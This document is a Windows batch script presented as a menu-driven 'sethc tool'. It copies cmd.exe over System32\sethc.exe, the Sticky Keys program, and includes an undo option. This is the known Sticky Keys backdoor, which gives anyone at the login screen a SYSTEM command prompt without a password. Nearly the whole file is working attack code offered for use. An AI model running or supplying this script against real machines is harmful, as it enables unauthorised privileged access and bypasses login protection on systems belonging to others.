@echo off

:menu
cls
echo Welcome to Sewans sethc tool V1.0.0
echo Select an Option
echo.
echo 1 Change sethc.exe to cmd {before running make sure to have ownership of sethc.exe}
echo 2 Change cmd to sethc.exe
echo 3 Exit

:Option
choice /c:123
if ERRORLEVEL 3 goto exit
if ERRORLEVEL 2 goto undo
if ERRORLEVEL 1 goto sethc
goto Option

:sethc
cls
cd C:\
md Sethc-BC
cd C:\Windows\System32
xcopy cmd.exe C:\Sethc-BC
cd C:\Windows\System32
xcopy sethc.exe C:\Sethc-BC
cd C:\Sethc-BC
rename sethc.exe sethc2.exe
rename cmd.exe sethc.exe
cd C:\Windows\System32
del sethc.exe
cd C:\Sethc-BC
xcopy sethc.exe C:\Windows\System32
del sethc.exe
echo Done...
pause
goto menu

:undo
cls
cd C:\Windows\System32
del sethc.exe
cd C:\Sethc-BC
rename sethc2.exe sethc.exe
xcopy sethc.exe C:\Windows\System32
del sethc.exe
cd C:
rd Sethc-BC
echo Done...
pause
goto menu

:exit
exit